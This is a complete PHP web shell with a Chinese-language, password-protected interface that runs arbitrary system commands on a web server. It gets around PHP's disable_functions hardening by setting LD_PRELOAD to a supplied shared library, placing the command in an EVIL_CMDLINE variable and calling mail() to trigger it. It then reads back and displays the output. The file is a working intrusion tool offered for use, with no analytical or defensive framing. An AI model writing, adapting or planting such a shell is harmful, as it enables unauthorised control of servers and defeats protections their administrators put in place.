<?php
// 密码验证配置
$valid_password = 'your_secure_password_here'; // 修改为您想要的密码

// 检查认证
session_start();

// 处理登录请求
if (isset($_POST['password'])) {
    if ($_POST['password'] === $valid_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "密码错误";
    }
}

// 处理退出请求
if (isset($_GET['logout'])) {
    unset($_SESSION['authenticated']);
    session_destroy();
    header("Location: ".strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// 如果未认证，显示登录表单
if (!isset($_SESSION['authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>身份验证</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background-color: #f8f9fa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                width: 100%;
                max-width: 400px;
                padding: 20px;
                background: white;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0,0,0,0.1);
            }
            .form-title {
                text-align: center;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2 class="form-title">命令工具认证</h2>
            <?php if (isset($error)) echo '<div class="alert alert-danger">'.$error.'</div>'; ?>
            <form method="POST" action="">
                <div class="mb-3">
                    <label for="password" class="form-label">密码</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">登录</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// 以下是已认证用户看到的内容
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统命令执行工具</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin-top: 50px;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        .result-box {
            background-color: #f1f1f1;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            min-height: 100px;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.3;
        }
        .form-label {
            font-weight: 600;
        }
        .btn-execute {
            background-color: #4e73df;
            border: none;
            padding: 10px 20px;
            font-weight: 600;
        }
        .btn-execute:hover {
            background-color: #2e59d9;
        }
        .output-line {
            margin-bottom: 2px;
            display: block;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
        }
    </style>
</head>
<body>
    <a href="?logout=1" class="btn btn-danger logout-btn">退出登录</a>
    
    <div class="container">
        <div class="header">
            <h2>系统命令执行工具</h2>
            <p class="text-muted">绕过disable_functions限制</p>
        </div>

        <form method="GET" action="">
            <div class="mb-3">
                <label for="cmd" class="form-label">命令</label>
                <input type="text" class="form-control" id="cmd" name="cmd" placeholder="输入要执行的命令，如: id, ls -la" value="<?= htmlspecialchars($_GET['cmd'] ?? '') ?>">
            </div>
            
            <div class="mb-3">
                <label for="outpath" class="form-label">输出文件路径</label>
                <input type="text" class="form-control" id="outpath" name="outpath" placeholder="如: /tmp/output.txt" value="<?= htmlspecialchars($_GET['outpath'] ?? '/tmp/output.txt') ?>">
            </div>
            
            <div class="mb-3">
                <label for="sopath" class="form-label">SO文件路径</label>
                <input type="text" class="form-control" id="sopath" name="sopath" placeholder="如: ./bypass_disablefunc_x64.so" value="<?= htmlspecialchars($_GET['sopath'] ?? './bypass_disablefunc_x64.so') ?>">
            </div>
            
            <button type="submit" class="btn btn-primary btn-execute">执行命令</button>
        </form>

        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
            echo '<div class="result-box mt-4">';
            echo '<h5>执行结果:</h5>';
            
            $cmd = $_GET["cmd"];
            $out_path = $_GET["outpath"];
            $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
            
            echo '<p><strong>完整命令:</strong> ' . htmlspecialchars($evil_cmdline) . '</p>';
            
            putenv("EVIL_CMDLINE=" . $evil_cmdline);
            
            $so_path = $_GET["sopath"];
            putenv("LD_PRELOAD=" . $so_path);
            
            mail("", "", "", "");
            
            if (file_exists($out_path)) {
                echo '<div class="alert alert-success" style="padding: 10px; margin-bottom: 5px;">';
                echo '<strong>输出内容:</strong><br>';
                $output = file_get_contents($out_path);
                $lines = explode("\n", $output);
                foreach ($lines as $line) {
                    echo '<span class="output-line">' . htmlspecialchars($line) . '</span>';
                }
                echo '</div>';
                unlink($out_path);
            } else {
                echo '<div class="alert alert-danger">';
                echo '命令执行失败或没有输出';
                echo '</div>';
            }
            
            echo '</div>';
        }
        ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>